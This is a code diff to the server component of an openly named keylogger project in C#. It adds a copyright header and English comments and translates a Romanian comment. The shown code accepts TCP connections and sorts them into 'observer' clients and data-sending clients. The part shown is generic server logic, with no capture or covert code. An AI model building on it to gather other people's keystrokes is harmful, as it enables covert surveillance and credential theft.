@@ -1,4 +1,22 @@
-﻿using System;
+﻿/*************************************************************************
+ *                                                                       *
+ *  File:        KeyloggerServer.cs                                      *
+ *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
+ *                         Cojocaru Valentin                             *
+ *  Website:     https://github.com/GlavanPavel/Keylogger                *
+ *  Description: Implements the main server logic for the keylogger      *
+ *               application, handling client connections and data       *
+ *               processing.                                             *
+ *                                                                       *
+ *  This code and information is provided "as is" without warranty of    *
+ *  any kind, either expressed or implied, including but not limited     *
+ *  to the implied warranties of merchantability or fitness for a        *
+ *  particular purpose. You are free to use this source code in your     *
+ *  applications as long as the original copyright notice is included.   *
+ *                                                                       *
+ *************************************************************************/
+
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -43,7 +61,7 @@ namespace ServerCore
             {
                 var acceptTask = Task.Run(() => AcceptClientsLoop(), cancellationToken);
 
-                // Wait until cancellation requested or server stops
+                // wait until cancellation requested or server stops
                 while (_running && !cancellationToken.IsCancellationRequested)
                 {
                     await Task.Delay(1000, cancellationToken);
@@ -51,7 +69,7 @@ namespace ServerCore
             }
             catch (OperationCanceledException)
             {
-                // Expected on cancellation
+                // expected on cancellation
             }
             finally
             {
@@ -68,7 +86,7 @@ namespace ServerCore
             _running = false;
             _listener?.Stop();
 
-            // Oprire toți clienții
+            // stop all clients
             lock (_lock)
             {
                 foreach (var client in _clients.ToList())
@@ -97,26 +115,37 @@ namespace ServerCore
             {
                 try
                 {
+                    // wait for a tcp client
                     TcpClient tcpClient = await _listener.AcceptTcpClientAsync();
+
+                    // read the reole of the client
                     string role = await ReadRoleAsync(tcpClient);
 
                     if (role.Equals("observer", StringComparison.OrdinalIgnoreCase))
                     {
                         var observer = new ObserverClient(tcpClient);
                         lock (_lock) _observers.Add(observer);
+
                         Console.WriteLine($"Observer registered: {observer.Id}");
+
+                        // start a background task to keep the observer connection alive
                         _ = Task.Run(() => KeepAliveObserver(observer));
                     }
                     else
                     {
+                        // standard connection
                         var handler = new ClientHandler
                         {
                             TcpClient = tcpClient,
+                            // use the remote endpoint as client ID
                             Id = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).ToString()
                         };
 
                         lock (_lock) _clients.Add(handler);
+
                         Console.WriteLine($"Standard client connected: {handler.Id}");
+
+                        // start handling client communication asynchronously
                         _ = HandleClientAsync(handler);
                     }
                 }
@@ -127,6 +156,7 @@ namespace ServerCore
                 }
             }
         }
+
 
         /// <summary>
         /// Reads the initial role string sent by a connected client.
